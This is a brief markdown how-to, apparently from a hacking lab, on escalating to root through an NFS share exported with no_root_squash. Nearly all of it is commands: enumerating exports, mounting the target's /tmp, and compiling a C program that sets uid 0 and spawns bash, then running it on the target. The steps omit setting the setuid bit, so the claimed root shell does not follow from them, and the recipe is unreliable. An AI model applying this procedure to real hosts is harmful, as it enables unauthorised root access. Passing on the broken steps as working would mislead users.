# Escalation vua NFS Root Squashing

## Enumeration

- `cat /etc/exports` in our example the "no root squash is defined for the tmp export. The folder is sharable and can be mounted  
![image](https://user-images.githubusercontent.com/96747355/170492475-be3f4b86-9814-4c4e-8b3f-498878469748.png)  

## Exploitation

### In our attacking machine

- `showmount -e IP-OF-TARGET` list the mountable folder of our target  
![image](https://user-images.githubusercontent.com/96747355/170492807-11bbb7d8-6d35-45f9-a46f-bb4ddccaa4e6.png)  
- `mkdir /tmp/1`
- `mount -o rw,vers=2 10.10.32.193:/tmp /tmp/1` we mount our folder
- `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c` 
- `gcc /tmp/1/x.c -o /tmp/1/x`  
![image](https://user-images.githubusercontent.com/96747355/170493149-af6c0e73-d280-4f6d-8aff-1e3641e01c47.png)  

### In our target

- `/tmp/x` we can execute our binary
- We should be root!  
![image](https://user-images.githubusercontent.com/96747355/170493310-57fdcd27-d27c-4668-b052-3bfbae88ffd7.png)  
